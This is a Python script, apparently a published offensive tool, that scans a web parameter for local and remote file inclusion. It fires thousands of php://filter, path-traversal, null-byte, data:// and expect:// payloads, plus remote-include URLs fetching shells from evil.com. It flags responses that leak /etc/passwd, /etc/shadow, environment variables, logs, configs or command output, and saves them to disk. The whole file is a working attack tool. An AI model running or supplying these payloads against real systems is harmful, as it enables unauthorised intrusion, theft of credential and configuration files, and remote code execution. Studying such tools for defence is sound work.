#!/usr/bin/env python3

import requests
import sys
import time
import base64
import urllib.parse
import threading
import json
import os
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional
from datetime import datetime

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class LFIWrapperScanner:
    def __init__(self, threads: int = 10, timeout: int = 10, proxy: str = None):
        self.threads = threads
        self.timeout = timeout
        self.proxy = self._setup_proxy(proxy)
        self.results = []
        self.tested_count = 0
        self.success_count = 0
        self.verified_vulnerabilities = []
        
        # Session for connection reuse
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        if self.proxy:
            self.session.proxies.update(self.proxy)

    def _setup_proxy(self, proxy: str) -> Dict[str, str]:
        if proxy:
            return {'http': proxy, 'https': proxy}
        
        # Check environment variables
        env_proxies = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy']
        for env_var in env_proxies:
            if env_proxy := os.getenv(env_var):
                self.print_status(f"Detected proxy: {env_proxy}", 'info')
                return {'http': env_proxy, 'https': env_proxy}
        
        return {}

    def print_status(self, message: str, msg_type: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        color_map = {
            'info': Color.BLUE,
            'success': Color.GREEN,
            'warning': Color.YELLOW,
            'error': Color.RED,
            'testing': Color.CYAN,
            'verified': Color.MAGENTA
        }
        
        color = color_map.get(msg_type, Color.WHITE)
        type_display = msg_type.upper()
        
        print(f"{Color.BOLD}[{timestamp}]{Color.END} {color}[{type_display}]{Color.END} {message}")

    def generate_wrappers(self, test_file: str = "/etc/passwd") -> List[str]:
        """All the PHP wrappers converted to Python"""
        wrappers = []
        
        # === PHP FILTER WRAPPERS ===
        basic_wrappers = [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16/resource=',
            'php://filter/convert.iconv.utf-8.utf-16be/resource=',
            'php://filter/convert.iconv.utf-16.utf-8/resource=',
            'php://filter/convert.iconv.utf-16le.utf-8/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/resource=',
            'php://filter/read=string.rot13/resource=',
            'php://filter/convert.quoted-printable-encode/resource=',
            'php://filter/read=convert.quoted-printable-encode/resource=',
            'php://filter/string.strip_tags/resource=',
            'php://filter/convert.base64-decode/resource=',
        ]
        
        # === PATH TRAVERSAL PAYLOADS ===
        traversal_payloads = [
            '../../../../../../../../../../../../../../../../../../../../../../',
            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f',
            '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f',
            '....//....//....//....//....//....//....//....//',
            '..\\..\\..\\..\\..\\..\\..\\..\\',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
            '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af',
        ]
        
        # === TEST FILES FOR DIFFERENT OS ===
        test_files = [
            # Linux/Unix
            '/etc/passwd',
            '/etc/hosts',
            '/etc/shadow',
            '/etc/group',
            '/etc/hostname',
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline',
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '/etc/passwd\\0',
            
            # Windows
            'c:\\windows\\system32\\drivers\\etc\\hosts',
            'c:/windows/system32/drivers/etc/hosts',
            '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'c:\\boot.ini',
            'c:/boot.ini',
            
            # Log files
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/nginx/access.log',
            '/var/log/httpd/access_log',
            '/var/log/auth.log',
            '/var/log/syslog',
            
            # Config files
            '/etc/ssh/sshd_config',
            '/etc/mysql/my.cnf',
            '/etc/php/8.2/apache2/php.ini',
            '/etc/apache2/apache2.conf',
            '/.env',
            'config/database.php',
            
            # Session files
            '/var/lib/php/sessions/sess_',
            '/tmp/sess_',
            
            # Special files
            '/dev/null',
            '/dev/zero',
            '/dev/random',
        ]
        
        # === COMPLEX WRAPPERS ===
        complex_wrappers = [
            'php://filter/convert.base64-encode|convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/convert.base64-encode/resource=',
            'php://filter/read=string.rot13|string.rot13|convert.base64-encode/resource=',
            'php://filter/convert.quoted-printable-encode|convert.base64-encode/resource=',
            'php://filter/string.toupper|convert.base64-encode/resource=',
            'php://filter/string.tolower|convert.base64-encode/resource=',
        ]
        
        # === GENERATE BASIC WRAPPERS ===
        for wrapper in basic_wrappers:
            for file in test_files:
                wrappers.append(wrapper + file)
        
        # === GENERATE COMPLEX WRAPPERS ===
        for wrapper in complex_wrappers:
            for file in test_files:
                wrappers.append(wrapper + file)
        
        # === GENERATE TRAVERSAL PAYLOADS ===
        for traversal in traversal_payloads:
            for file in test_files:
                wrappers.append(traversal + file)
                # With wrapper
                for basic_wrapper in basic_wrappers:
                    wrappers.append(basic_wrapper + traversal + file)
        
        # === DATA WRAPPERS ===
        test_content = base64.b64encode(b"<?php echo 'VULNERABLE'; ?>").decode()
        data_wrappers = [
            f'data://text/plain;base64,{test_content}',
            'data://text/plain,' + urllib.parse.quote("<?php echo 'VULNERABLE'; ?>"),
            f'data://text/plain;charset=base64,{test_content}',
            'data://text/plain;charset=us-ascii,' + urllib.parse.quote("<?php echo 'VULNERABLE'; ?>"),
        ]
        wrappers.extend(data_wrappers)
        
        # === EXPECT WRAPPERS ===
        expect_wrappers = [
            'expect://whoami',
            'expect://id',
            'expect://ls',
            'expect://pwd',
            'expect://cat /etc/passwd',
            'expect://uname -a',
        ]
        wrappers.extend(expect_wrappers)
        
        # === RFI WRAPPERS ===
        rfi_wrappers = [
            'http://evil.com/shell.txt',
            'https://raw.githubusercontent.com/evil/shell/master/shell.php',
            'ftp://user:pass@evil.com/shell.txt',
            'phar://evil.com/shell.phar',
        ]
        wrappers.extend(rfi_wrappers)
        
        # === NULL BYTE INJECTION ===
        null_byte_wrappers = []
        for file in test_files:
            null_byte_wrappers.extend([
                file + '%00',
                file + '%00.jpg',
                file + '\\0',
                file + '\\\\0'
            ])
        wrappers.extend(null_byte_wrappers)
        
        return list(set(wrappers))

    def verify_vulnerability(self, content: str, wrapper: str) -> Optional[Dict[str, Any]]:
        indicators = {
            # Linux/Unix files
            'root:x:0:0': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/passwd'},
            'root:*:': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/shadow'},
            'daemon:x:1:1': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/passwd'},
            '127.0.0.1': {'confidence': 'medium', 'type': 'LFI', 'file': '/etc/hosts'},
            'root:': {'confidence': 'medium', 'type': 'LFI', 'file': '/etc/group'},
            'Linux': {'confidence': 'medium', 'type': 'LFI', 'file': '/proc/version'},
            'PATH=': {'confidence': 'high', 'type': 'LFI', 'file': '/proc/self/environ'},
            
            # Windows files
            'localhost': {'confidence': 'medium', 'type': 'LFI', 'file': 'hosts'},
            '[boot loader]': {'confidence': 'high', 'type': 'LFI', 'file': 'boot.ini'},
            
            # PHP execution
            'VULNERABLE': {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper'},
            
            # Base64 encoded content patterns
            'cm9vdDp4OjA6MA': {'confidence': 'high', 'type': 'LFI', 'file': 'base64 /etc/passwd'},
            'ZGFlbW9u': {'confidence': 'high', 'type': 'LFI', 'file': 'base64 /etc/passwd'},
            
            # Command execution
            'uid=': {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'},
            'www-data': {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'},
            '/home/': {'confidence': 'medium', 'type': 'RCE', 'file': 'command execution'},
            
            # Log files
            'GET /': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
            'POST /': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
            
            # Config files
            'AllowUsers': {'confidence': 'medium', 'type': 'LFI', 'file': 'sshd_config'},
            'extension=': {'confidence': 'medium', 'type': 'LFI', 'file': 'php.ini'},
        }
        
        # Check for exact content matches
        for pattern, info in indicators.items():
            if pattern in content:
                return info
        
        # Check for base64 encoded content
        import re
        if re.match(r'^[A-Za-z0-9+/=]{20,}$', content[:200]):
            try:
                decoded = base64.b64decode(content[:500]).decode('utf-8', errors='ignore')
                for pattern, info in indicators.items():
                    if pattern in decoded:
                        return {'confidence': 'high', 'type': 'LFI', 'file': f"base64 encoded {info['file']}"}
            except:
                pass
        
        # Check for ROT13 content
        def rot13(text):
            result = []
            for char in text:
                if 'a' <= char <= 'z':
                    result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
                elif 'A' <= char <= 'Z':
                    result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
                else:
                    result.append(char)
            return ''.join(result)
        
        rot13_content = rot13(content[:500])
        for pattern, info in indicators.items():
            if pattern in rot13_content:
                return {'confidence': 'high', 'type': 'LFI', 'file': f"ROT13 encoded {info['file']}"}
        
        # Check response length
        content_length = len(content)
        if 1000 < content_length < 10000:
            return {'confidence': 'low', 'type': 'potential', 'file': 'unusual response size'}
        
        return None

    def test_payload(self, target_url: str, parameter: str, wrapper: str) -> Dict[str, Any]:
        """Test a single payload"""
        # Build URL
        separator = '&' if '?' in target_url else '?'
        test_url = f"{target_url}{separator}{parameter}={urllib.parse.quote(wrapper)}"
        
        try:
            start_time = time.time()
            response = self.session.get(test_url, timeout=self.timeout, verify=False)
            response_time = time.time() - start_time
            
            result = {
                'wrapper': wrapper,
                'url': test_url,
                'http_code': response.status_code,
                'response_time': response_time,
                'response': response.text,
                'error': None,
                'success': response.status_code == 200 and len(response.text) > 0
            }
            
        except Exception as e:
            result = {
                'wrapper': wrapper,
                'url': test_url,
                'http_code': 0,
                'response_time': 0,
                'response': '',
                'error': str(e),
                'success': False
            }
        
        return result

    def scan(self, target_url: str, parameter: str, test_file: str = "/etc/passwd"):
        """Main scanning function with threading"""
        self.print_status(f"Starting LFI Wrapper Scanner against: {target_url}", 'info')
        self.print_status(f"Testing parameter: {parameter}", 'info')
        self.print_status(f"Test file: {test_file}", 'info')
        if self.proxy:
            self.print_status(f"Using proxy: {self.proxy}", 'info')
        print("-" * 80)
        
        # Test connection first
        self.print_status("Testing connection to target...", 'testing')
        try:
            test_response = self.session.get(target_url, timeout=self.timeout, verify=False)
            self.print_status(f"Connection successful. HTTP Code: {test_response.status_code}", 'success')
        except Exception as e:
            self.print_status(f"Connection error: {e}", 'error')
            self.print_status("If you're behind proxy, use: --proxy http://proxy:port", 'warning')
            return
        
        # Generate payloads
        wrappers = self.generate_wrappers(test_file)
        self.print_status(f"Generated {len(wrappers)} payloads", 'info')
        
        # Threaded scanning
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_wrapper = {
                executor.submit(self.test_payload, target_url, parameter, wrapper): wrapper 
                for wrapper in wrappers
            }
            
            for future in as_completed(future_to_wrapper):
                wrapper = future_to_wrapper[future]
                self.tested_count += 1
                
                try:
                    result = future.result()
                    
                    if result['error']:
                        self.print_status(f"✗ Request failed: {result['error']}", 'error')
                        continue
                    
                    # Verify vulnerability
                    verification = self.verify_vulnerability(result['response'], wrapper)
                    
                    if verification:
                        self.success_count += 1
                        
                        status = f"{Color.GREEN}VULNERABLE{Color.END}"
                        confidence_color = Color.GREEN
                        if verification['confidence'] == 'high':
                            status = f"{Color.RED}HIGHLY VULNERABLE{Color.END}"
                            confidence_color = Color.RED
                        elif verification['confidence'] == 'medium':
                            status = f"{Color.YELLOW}LIKELY VULNERABLE{Color.END}"
                            confidence_color = Color.YELLOW
                        
                        self.print_status(f"✓ {status} - {wrapper}", 'success')
                        self.print_status(f"  Type: {verification['type']} | File: {verification['file']}", 'verified')
                        self.print_status(f"  HTTP Code: {result['http_code']} | Time: {result['response_time']:.2f}s", 'info')
                        
                        finding = {
                            'wrapper': wrapper,
                            'url': result['url'],
                            'confidence': verification['confidence'],
                            'type': verification['type'],
                            'file': verification['file'],
                            'response': result['response'][:500],
                            'http_code': result['http_code'],
                            'verified': True
                        }
                        
                        self.results.append(finding)
                        self.verified_vulnerabilities.append(finding)
                        self.save_finding(finding)
                        
                    else:
                        self.print_status(f"✗ Not vulnerable - {wrapper}", 'error')
                        
                except Exception as e:
                    self.print_status(f"✗ Failed: {e}", 'error')
        
        self.generate_report()

    def save_finding(self, finding: Dict[str, Any]):
        """Save finding to file"""
        filename = f"lfi_findings_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        content = "=== LFI Finding ===\n"
        content += f"Wrapper: {finding['wrapper']}\n"
        content += f"URL: {finding['url']}\n"
        content += f"Type: {finding['type']}\n"
        content += f"File: {finding['file']}\n"
        content += f"Confidence: {finding['confidence']}\n"
        content += f"HTTP Code: {finding['http_code']}\n"
        content += f"Verified: {'YES' if finding['verified'] else 'NO'}\n"
        content += f"Response preview:\n{finding['response']}\n"
        content += "==================\n\n"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content)

    def generate_report(self):
        """Generate final report"""
        print("\n" + "=" * 80)
        self.print_status("SCAN COMPLETED", 'info')
        self.print_status(f"Total tests: {self.tested_count}", 'info')
        self.print_status(f"Potential vulnerabilities: {self.success_count}", 
                         'success' if self.success_count > 0 else 'warning')
        self.print_status(f"Verified vulnerabilities: {len(self.verified_vulnerabilities)}", 
                         'success' if self.verified_vulnerabilities else 'warning')
        
        if self.verified_vulnerabilities:
            self.print_status("\nVERIFIED VULNERABILITIES:", 'success')
            for result in self.verified_vulnerabilities:
                color = Color.RED if result['confidence'] == 'high' else (
                    Color.YELLOW if result['confidence'] == 'medium' else Color.GREEN
                )
                print(f"{color}[{result['confidence'].upper()}]{Color.END} {Color.CYAN}[{result['type']}]{Color.END} {result['url']}")
                print(f"     File: {result['file']}")
        
        self.print_status(f"\nFindings saved to: lfi_findings_*.txt", 'info')

    def show_banner(self):
        banner = f"""
{Color.CYAN}
                           _          _____      
 __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
 \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
                    |_|         |_|              
{Color.END}
        {Color.YELLOW}LFI Wrapper Scanner{Color.END}
        {Color.BLUE}Python Wrapper-based LFI Detection Tool{Color.END}
        {Color.MAGENTA}Author: csshark{Color.END}
        
        """
        print(banner)

def main():
    scanner = LFIWrapperScanner()
    scanner.show_banner()
    
    parser = argparse.ArgumentParser(description='LFI Wrapper Scanner')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('param', help='Parameter to test')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', '-to', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--proxy', '-p', help='Proxy (http://proxy:port)')
    parser.add_argument('--file', '-f', default='/etc/passwd', help='Test file (default: /etc/passwd)')
    
    args = parser.parse_args()
    
    # Update scanner settings
    scanner.threads = args.threads
    scanner.timeout = args.timeout
    if args.proxy:
        scanner.proxy = {'http': args.proxy, 'https': args.proxy}
        scanner.session.proxies.update(scanner.proxy)
    
    scanner.scan(args.url, args.param, args.file)

if __name__ == "__main__":
    main()
